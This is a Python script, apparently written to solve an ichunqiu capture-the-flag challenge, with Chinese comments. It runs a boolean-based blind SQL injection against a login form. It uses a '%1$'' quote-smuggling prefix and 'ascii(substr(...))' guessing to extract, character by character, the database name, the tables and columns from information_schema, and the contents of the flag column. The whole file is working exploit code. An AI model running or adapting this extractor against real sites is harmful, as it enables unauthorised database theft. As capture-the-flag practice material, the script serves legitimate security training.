import requests

def getDbName():  # 获取数据库名为 ctf
    dbname = ""
    for d in range(1, 20):
        for i in range(0, 132):
            payload2 = rf" or ascii(substr(database(),{str(d)},1))={str(i)} #"
            payload = payload1 + payload2
            data = {'username': payload, 'password': 'abc'}
            r_c = R.post(url, data=data, headers=headers)
            sc = str(r_c.content, encoding="utf8")
            print("--------d is " + str(d) + " i is" + str(i) + "  code is" + str(r_c.status_code) + "----------")
            if "password error" in sc:
                # print(sc)
                # print(i)
                sascii = chr(i)
                dbname += sascii
                print(dbname)
                if int(i) == 0:
                    break
    print(dbname)


def getTablesName():  # 获取表名为 {'flag', 'user'}
    tablesname = set()
    for l in range(0, 6):
        tablename = ''
        for d in range(1, 20):
            for i in range(0, 132):
                payload2 = rf" or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {str(l)},1),{str(d)},1))={str(i)} #"
                payload = payload1 + payload2
                data = {'username': payload, 'password': 'abc'}
                r_c = R.post(url, data=data, headers=headers)
                sc = str(r_c.content, encoding="utf8")
                print("--------L is " + str(l) + " | D is " + str(d) + " | I is" + str(i) + "  code is" + str(
                    r_c.status_code) + "----------")
                if "password error" in sc:
                    # print(sc)
                    # print(i)
                    sascii = chr(i)
                    tablename += sascii
                    print(tablename)
                    if int(i) == 0:
                        tablesname.add(tablename.strip("\x00"))
                        break
    print(tablesname)


def getColumnsName(tablename=None):  # 获取字段 {'id', 'flag'}
    columnsname = set()
    for l in range(0, 2):
        columnname = ''
        for d in range(1, 20):
            for i in range(0, 132):
                payload2 = rf" or ascii(substr((select column_name from information_schema.columns where table_schema=database() limit {str(l)},1),{str(d)},1))={str(i)} #"
                payload = payload1 + payload2
                data = {'username': payload, 'password': 'abc'}
                r_c = R.post(url, data=data, headers=headers)
                sc = str(r_c.content, encoding="utf8")
                # print(sc)
                print("--------L is " + str(l) + " | D is " + str(d) + " | I is" + str(i) + "  code is" + str(
                    r_c.status_code) + "----------")
                if "password error" in sc:
                    # print(sc)
                    # print(i)
                    sascii = chr(i)
                    columnname += sascii
                    print(columnname)
                    if int(i) == 0:
                        columnsname.add(columnname.strip("\x00"))
                        break
    print(columnsname)


def getDumpsName(tablename=None, columnname=None):  # 获取字段 {'id', 'flag'}
    dumpsname = set()
    for l in range(0, 2):
        dumpname = ''
        for d in range(1, 50):
            for i in range(0, 132):
                payload2 = rf" or ascii(substr((select {columnname} from {tablename} limit {str(l)},1),{str(d)},1))={str(i)} #"
                payload = payload1 + payload2
                data = {'username': payload, 'password': 'abc'}
                r_c = R.post(url, data=data, headers=headers)
                sc = str(r_c.content, encoding="utf8")
                # print(sc)
                print("--------L is " + str(l) + " | D is " + str(d) + " | I is" + str(i) + "  code is" + str(
                    r_c.status_code) + "----------")
                if "password error" in sc:
                    # print(sc)
                    # print(i)
                    sascii = chr(i)
                    dumpname += sascii
                    print(dumpname)
                    if int(i) == 0:
                        dumpsname.add(dumpname.strip("\x00"))
                        break
    print(dumpsname)


if __name__ == '__main__':
    R = requests.Session()
    url = "http://0b7a6318001548d69311717c1073d857aceca55eae2040b6.changame.ichunqiu.com/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36/8mqQhSuL-09",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://eab7c023a15340f9b35b26a905b3ae0a95b25f3502174566.changame.ichunqiu.com/index.php",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "28",
        "Origin": "http://eab7c023a15340f9b35b26a905b3ae0a95b25f3502174566.changame.ichunqiu.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
    }
    payload1 = "%1$'"
    R.get(url=url)

    # getDbName()                      #  获取当前数据库名
    # getTablesName()                  #  获取表名
    # getColumnsName(tablename="flag") #  获取字段名 可以在where 后加入and table_name=tablename
    getDumpsName("flag", "flag")  # 获取数据
